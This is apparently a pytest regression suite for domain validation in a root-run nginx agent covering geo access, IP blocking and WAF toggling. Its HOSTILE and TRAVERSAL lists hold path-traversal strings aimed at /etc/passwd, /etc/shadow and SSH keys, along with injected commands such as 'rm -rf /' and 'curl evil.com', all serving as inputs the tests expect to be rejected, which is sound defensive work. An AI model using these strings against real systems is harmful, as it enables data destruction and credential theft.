"""
Domain validation is the only thing standing between a request body and the
filesystem, and the agent runs as root. These tests are the regression guard.

Covers all three features that turn a caller-supplied domain into a path:
geo access control, IP blocking, and WAF toggling.
"""
import sys
import types
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))

try:  # pragma: no cover - platform dependent
    import fcntl  # noqa: F401
except ImportError:  # pragma: no cover
    _fcntl = types.ModuleType("fcntl")
    _fcntl.flock = lambda *a, **k: None
    _fcntl.LOCK_EX, _fcntl.LOCK_UN, _fcntl.LOCK_SH = 2, 8, 1
    sys.modules["fcntl"] = _fcntl

from fastapi import HTTPException  # noqa: E402

import src.geo_control as geo  # noqa: E402
import src.ip_block as ipb  # noqa: E402
from src.domains import (  # noqa: E402
    normalize_domain,
    safe_domain_path,
    sanitize_domain_for_variable,
)

# Inputs that must never reach the filesystem.
HOSTILE = [
    "../../../etc/passwd",
    "../../etc/nginx/nginx.conf",
    "..",
    ".",
    "./etc",
    "/etc/passwd",
    "/etc/shadow",
    "//etc/passwd",
    "C:\\Windows\\System32\\config\\SAM",
    "..\\..\\windows\\system32",
    "example.com/../../../etc/passwd",
    "example.com/../evil",
    "foo/bar",
    "foo\\bar",
    "example.com\x00.txt",
    "example\n.com",
    "example.com\n[evil]",
    "example.com;rm -rf /",
    "example.com|whoami",
    "example.com$(id)",
    "example.com`id`",
    "example.com&&curl evil.com",
    "$(curl evil.com)",
    "",
    "   ",
    ".example.com",
    "example..com",
    "-evil.com",
    "example.-com",
    "evil-.com",
    "~root/.ssh/authorized_keys",
    "%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "*",
    "*.example.com",
    "localhost",          # single label: no dot, would be a bare filename
    "example",
    "a" * 254 + ".com",   # over the 253-char limit
    None,
    12345,
]

VALID = [
    "example.com",
    "gnzabe.com",
    "waf.zergaw.et",
    "deep.sub.domain.example.co.uk",
    "my-site.com",
    "site1.example.com",
    "xn--80ak6aa92e.com",   # punycode / IDN
    "a.co",
]


# ─── the validator itself ───────────────────────────────────────────────────

@pytest.mark.parametrize("raw", HOSTILE)
def test_hostile_input_is_rejected(raw):
    with pytest.raises(HTTPException) as excinfo:
        normalize_domain(raw)
    assert excinfo.value.status_code == 400


@pytest.mark.parametrize("raw", VALID)
def test_real_domains_and_subdomains_are_accepted(raw):
    assert normalize_domain(raw) == raw


def test_normalization_is_case_and_whitespace_insensitive():
    assert normalize_domain("  EXAMPLE.COM  ") == "example.com"
    assert normalize_domain("Waf.Zergaw.ET") == "waf.zergaw.et"
    assert normalize_domain("example.com.") == "example.com"
    assert normalize_domain("example.com\n") == "example.com"


def test_normalization_is_idempotent():
    for raw in VALID:
        assert normalize_domain(normalize_domain(raw)) == normalize_domain(raw)


def test_trailing_newline_cannot_slip_past_the_anchor():
    """
    Python's `$` also matches before a trailing newline, so a `$`-anchored
    pattern would accept "evil.com\\n". The pattern uses \\Z; this pins that.
    """
    assert normalize_domain("example.com\n") == "example.com"

    with pytest.raises(HTTPException):
        normalize_domain("example.com\nrm -rf /")


# ─── safe_domain_path containment ───────────────────────────────────────────

def test_safe_domain_path_builds_inside_the_base(tmp_path):
    result = safe_domain_path(tmp_path, "example.com", ".allow")
    assert result == tmp_path / "example.com.allow"
    assert result.resolve().parent == tmp_path.resolve()


def test_safe_domain_path_supports_a_prefix(tmp_path):
    result = safe_domain_path(tmp_path, "example.com", ".conf", prefix="waf-geo-")
    assert result == tmp_path / "waf-geo-example.com.conf"


@pytest.mark.parametrize("raw", ["../../etc/passwd", "/etc/shadow", "..", "*"])
def test_safe_domain_path_refuses_hostile_domains(tmp_path, raw):
    with pytest.raises(HTTPException):
        safe_domain_path(tmp_path, raw, ".allow")


def test_variable_name_sanitization():
    assert sanitize_domain_for_variable("gnzabe.com") == "gnzabe_com"
    assert sanitize_domain_for_variable("my-site.co.uk") == "my_site_co_uk"


# ─── every path builder, across all three features ──────────────────────────

GEO_BUILDERS = [
    ("geo allow list", lambda d: geo.get_allow_list_path(d)),
    ("geo deny list", lambda d: geo.get_deny_list_path(d)),
    ("geo map config", lambda d: geo.get_map_config_path(d)),
    ("geo allow_only", lambda d: geo.get_allow_only_conf_path(d)),
    ("geo deny_only", lambda d: geo.get_deny_only_conf_path(d)),
    ("geo active", lambda d: geo.get_active_conf_path(d)),
]

IP_BUILDERS = [
    ("ip block map", lambda d: ipb.get_block_file_path(d)),
    ("ip map config", lambda d: ipb.get_map_config_path(d)),
    ("ip server rule", lambda d: ipb.get_server_rule_path(d)),
]

TRAVERSAL = [
    "../../../etc/passwd",
    "/etc/shadow",
    "..",
    "example.com/../../../etc/passwd",
    "..\\..\\windows\\system32",
    "*",
]


@pytest.mark.parametrize("name,builder", GEO_BUILDERS + IP_BUILDERS)
@pytest.mark.parametrize("raw", TRAVERSAL)
def test_no_path_builder_escapes_its_directory(name, builder, raw):
    """
    The IP-block builders originally interpolated the domain straight into a
    path with no validation, so /ban could write anywhere as root.
    """
    with pytest.raises(HTTPException):
        builder(raw)


@pytest.mark.parametrize("name,builder", GEO_BUILDERS + IP_BUILDERS)
def test_every_builder_accepts_a_normal_domain(name, builder):
    assert "gnzabe.com" in str(builder("gnzabe.com"))


@pytest.mark.parametrize("name,builder", GEO_BUILDERS + IP_BUILDERS)
def test_every_builder_normalizes_case(name, builder):
    assert str(builder("GNZABE.com")) == str(builder("gnzabe.com"))


# ─── the /ban entry point ───────────────────────────────────────────────────

def test_ban_reports_an_invalid_domain_without_aborting_the_batch(monkeypatch):
    """One bad entry must not stop the valid ones being processed."""
    processed = []

    monkeypatch.setattr(ipb, "ensure_directories", lambda: None)
    monkeypatch.setattr(
        ipb, "update_block_file", lambda d, ip, a: processed.append(d) or True
    )
    monkeypatch.setattr(ipb, "ensure_map_config", lambda d: None)
    monkeypatch.setattr(ipb, "ensure_server_rule", lambda d: None)
    monkeypatch.setattr(ipb, "ensure_vhost_includes_rule", lambda d: [])
    monkeypatch.setattr(ipb, "_debounced_reload_nginx", lambda: None)

    result = ipb.ban_unban_ip(
        "1.2.3.4", ["good.com", "../../../etc/passwd", "also-good.com"], "ban"
    )

    assert processed == ["good.com", "also-good.com"]

    by_domain = {r["domain"]: r for r in result["results"]}
    assert by_domain["../../../etc/passwd"]["changed"] is False
    assert "Invalid domain" in by_domain["../../../etc/passwd"]["message"]
    assert by_domain["good.com"]["changed"] is True


def test_waf_toggle_rejects_a_hostile_domain():
    from src.waf_toggle import toggle_waf_for_domain

    with pytest.raises(HTTPException) as excinfo:
        toggle_waf_for_domain("../../etc/nginx/nginx.conf", True, require_signature=False)
    assert excinfo.value.status_code == 400
